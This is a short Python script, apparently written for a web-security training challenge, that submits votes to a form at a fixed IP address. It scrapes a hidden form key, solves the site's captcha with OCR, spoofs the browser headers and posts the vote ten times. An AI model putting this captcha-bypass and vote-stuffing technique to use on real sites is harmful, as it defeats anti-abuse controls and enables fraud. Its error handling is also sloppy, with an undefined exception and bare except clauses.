#!/usr/bin/python3
import requests
import logging
from urllib import request
from PIL import Image
import pytesseract as pyte
import cv2

def init_logger():
    """Initialize a logger for info control"""
    LOG_FORMAT = "%(message)s"
    logging.basicConfig(filename = "Control.log", level = logging.DEBUG, format = LOG_FORMAT, filemode = "w")
    logger = logging.getLogger()
    return logger

def found_key(url):
    page = request.urlopen(url)
    data = page.read()
    data = data.decode("UTF-8")
    fragment_key = ""
    key = ""
    for letter in range(len(data)):
        try:
            if data[letter:letter + 6] == "hidden":
                while(data[letter] != "/"):
                    fragment_key += data[letter]
                    letter += 1
        except:
            print("No se encontro")
        if fragment_key:
            break
    fragment_key += "/"
    for i in range(len(fragment_key)):
        try:
            if fragment_key[i:i + 5] == "value":
                while(fragment_key[i] != "/"):
                    key += fragment_key[i]
                    i += 1
        except:
            print("Something wrong")
    key = key[7:-2]
    return key

def get_image():
    image_url = "http://158.69.76.135/captcha.php"
    try:
        response = requests.get(image_url, stream = True)
        if response.status_code == 200:
            file = open("Image.png", "wb")
            file.write(response.content)
            file.close()
        else:
            raise SomeError()
    except:
        print("Something wrong")
    return "Image.png"

def get_captcha(image):
	img = cv2.imread(image)
	img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
	return (pyte.image_to_string(img))

log = init_logger()
url = "http://158.69.76.135/level3.php"
key = found_key(url)
image = get_image()
captcha = get_captcha(image)
header_key = {"Cookie":"HoldTheDoor={}".format(key), "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
, "referer":url}
data_key = {"id":"2277", "holdthedoor":"Submit+Query", "key":key, "captcha":captcha[:4]}
print(data_key)

#print("Sending requests....")

for i in range(10):
    try:
        requests.post(url, data = data_key, headers = header_key)
        log.info("Success")
    except:
        log.info("Fail")
print("Finish")
